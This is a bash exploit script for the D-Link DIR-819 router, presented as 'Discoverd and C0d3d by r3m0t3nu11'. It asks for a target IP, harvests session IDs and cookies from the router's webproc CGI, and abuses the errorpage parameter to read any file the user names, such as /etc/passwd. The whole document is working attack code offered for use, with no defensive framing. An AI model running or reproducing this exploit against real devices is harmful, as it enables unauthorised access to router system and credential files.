#!/bin/bash
rm .session.txt;rm .index.html 2>/dev/null
rm .1session.txt;rm .1index.html 2>/dev/null
rm .cookie1.txt 2>/dev/null
clear
echo 
echo 
echo

echo -e "\033[1;31m
██████╗ ██╗     ██╗███╗   ██╗██╗  ██╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔══██╗██║     ██║████╗  ██║██║ ██╔╝     ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║  ██║██║     ██║██╔██╗ ██║█████╔╝█████╗█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██║  ██║██║     ██║██║╚██╗██║██╔═██╗╚════╝██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
██████╔╝███████╗██║██║ ╚████║██║  ██╗     ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                                               
\033[0m"
echo -n "D-Link version :DIR-819"
echo
echo
echo -n "Discoverd and C0d3d by r3m0t3nu11"
echo
echo
echo
echo -e -n "\033[1;31m Enter IP: \033[0m"
read url

if [ -z $url ];then
	echo
	echo "You did not enter vaild url"
	exit
fi

curl -s http://$url/cgi-bin/webproc/index.html -o .1index.html
curl -s http://$url/cgi-bin/webproc -o .1index.html
curl -s -c - http://$url/cgi-bin/webproc|grep xxid > .cookie.txt
cat .cookie.txt 2>/dev/null|grep FALSE|cut -d '/' -f2|cut -d 'x' -f3|cut -d 'i' -f2|cut -d 'd' -f2|awk '{print $1}' >> .cookie1.txt
cat .index.html 2>/dev/null|grep ':sessionid'|cut -d ':' -f3|cut -d "'" -f2|sort -u > .session.txt
cat .1index.html 2>/dev/null|grep ':sessionid'|cut -d ':' -f3|cut -d "'" -f2|sort -u > .1session.txt
for r3m0t3 in $(cat .session.txt) 
do 
    echo -e "\033[1;32m [+] \033[0m" "\033[1;36m We got session id $r3m0t3 please wait.....................\033[0m"
done
echo "==========================================================================="
for r3m0t31 in $(cat .1session.txt) 
do 
    echo -e "\033[1;32m [+] \033[0m" "\033[1;36m We got session id $r3m0t31 please wait.....................\033[0m"
done
echo "==========================================================================="
for z3r0w4y in $(cat .cookie1.txt) 
do 
    echo -e "\033[1;32m [+] \033[0m" "\033[1;36m We got cookie id $z3r0w4y please wait.....................\033[0m"
done
echo "==========================================================================="
echo -e -n "\033[1;33m Enter file you want to read...like /etc/passwd: \033[0m"
read r3m0t3nu11
echo "==========================================================================="
for i in $(cat .session.txt); do
    curl -X POST http://$url/cgi-bin/webproc -d "getpage=html%2Findex.html&errorpage=$r3m0t3nu11&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin&%3Apassword=dsdsdsd&%3Aaction=login&%3Asessionid=$i"
done
for t in $(cat .1session.txt); do
    curl -X POST http://$url/cgi-bin/webproc -d "getpage=html%2Findex.html&errorpage=$r3m0t3nu11&var%3Amenu=basic&var%3Apage=Bas_wansum&obj-action=auth&%3Ausername=Admin&%3Apassword=ZHNk&var%3Asys_Token=43434&%3Aaction=login&%3Asessionid=$t"
done

for g in $(cat .cookie1.txt); do
    curl -i -s -k  -X $'POST' \
    -H $'Host: $url' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:47.0) Gecko/20100101 Firefox/47.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://$url/cgi-bin/webproc' -H $'Cookie: sessionid=5454545; auth=nok; xxid=$g; sys_UserName=admin' -H $'Connection: close' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 198' \
    -b $'sessionid=$t; auth=nok; xxid=$g; sys_UserName=admin' \
    --data-binary $'getpage=html%2Findex.html&errorpage=$r3m0t3nu11&var%3Amenu=basic&var%3Apage=Bas_wlansum&obj-action=auth&%3Ausername=admin&%3Apassword=&var%3Asys_Token=1656478042&%3Aaction=login&%3Asessionid=$t' \
    $'http://$url/cgi-bin/webproc'
done

